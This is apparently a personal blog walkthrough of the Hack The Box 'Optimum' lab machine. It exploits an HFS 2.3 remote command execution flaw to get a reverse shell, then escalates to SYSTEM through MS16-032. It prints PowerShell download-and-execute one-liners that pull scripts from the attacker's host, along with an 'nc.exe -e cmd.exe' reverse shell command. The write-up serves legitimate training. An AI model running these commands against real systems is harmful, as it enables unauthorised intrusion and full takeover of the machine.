---
title: Hack The Box - Optimum (Without Metasploit)
date: 2021-01-12 18:19:00 +0800
categories: [hackthebox]
tags: [windows, hfs]
---

![](/assets/images/optimum.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.8 optimum.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

To speed up my recon, I've moved to [`rustscan`](https://github.com/RustScan/RustScan). I've also created 2 "aliases" called `superscan` and `resolve`.

```bash 
$ which resolve 
resolve () {
        cat /etc/hosts | grep --color=auto "$1" | cut -d " " -f 1
}

$ which superscan
superscan () {
        name="$(resolve $1)" 
        rustscan --accessible -a "$name" -r 1-65535 -- -sT -sV -sC -Pn
}

$ superscan optimum.htb                                                                  1 ⨯
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.8:80
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-12 10:56 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:56
Completed Parallel DNS resolution of 1 host. at 10:56, 1.11s elapsed
DNS resolution of 1 IPs took 1.11s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:56
Scanning 10.10.10.8 [1 port]
Discovered open port 80/tcp on 10.10.10.8
Completed Connect Scan at 10:56, 0.01s elapsed (1 total ports)
Initiating Service scan at 10:56
Scanning 1 service on 10.10.10.8
Completed Service scan at 10:56, 6.05s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.8.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
Nmap scan report for 10.10.10.8
Host is up, received user-set (0.0075s latency).
Scanned at 2021-01-12 10:56:36 UTC for 7s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:56
Completed NSE at 10:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds
```

# Enumeration (1)

## Port 80 `HttpFileServer httpd 2.3`

![](/assets/images/optimum1.png)

Even though there is a login, we didn't have credentials so lets search if there are any exploits for this service.

```bash
$ searchsploit hfs 2.3
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)            | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload         | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)    | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)    | windows/remote/39161.py
...
```

# Exploitation (1)

The ```Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)``` seems promising. After copying it, we will need to setup a web server that hosts a `nc.exe`.

```bash
$ mkdir web
$ cd web
$ cp /usr/share/windows-resources/binaries/nc.exe .
$ sudo updog -p 80
[sudo] password for kali: 
[+] Serving /home/kali/Desktop/web...
 * Running on http://0.0.0.0:80/ (Press CTRL+C to 
```

Then, we start our `nc` listener.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

And finally we modify the `ip_addr` and `local_port` variable in the script and run it.
```bash
$ cat 39161.py
...
        ip_addr = "10.10.XX.XX" #local IP address
        local_port = "1337" # Local Port number

$ python 39161.py optimum.htb 80
```

We will see some requests for `nc.exe` on our web server as well as see that we got a shell as `kostas`.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.8] 49158
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserve

C:\Users\kostas\Desktop> whoami
optimum\kostas
```

# user.txt

The user flag is in `kostas`'s Desktop.

```
C:\Users\kostas\Desktop> type user.txt.txt
d0c3XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

We run [`Sherlock.ps1`](https://github.com/rasta-mouse/Sherlock) and see that the machine might be vulnerable to some kernel exploits. 

```
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/sherlock.ps1'); Find-AllVulns
...

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable
...
```

# Exploitation (2)

I decided to target `MS16-032` and found a [script](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) that can exploit this for us.

We first have to start a `nc` listener.

```bash
$ nc -vlnp 1337 
listening on [any] 1337 ...
```

And then run the exploit script that will start a reverse shell connection to us.

```
C:\temp> C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

On our listener, we get a connection as `SYSTEM`!

```bash
$ sudo rlwrap nc -lvnp 1337     
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.8] 49285
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator> whoami
nt authority\system
```

# root.txt

The root flag is stored in the `Administrator`'s Desktop, as always.

```
C:\Users\Administrator\Desktop>type root.txt
51edXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !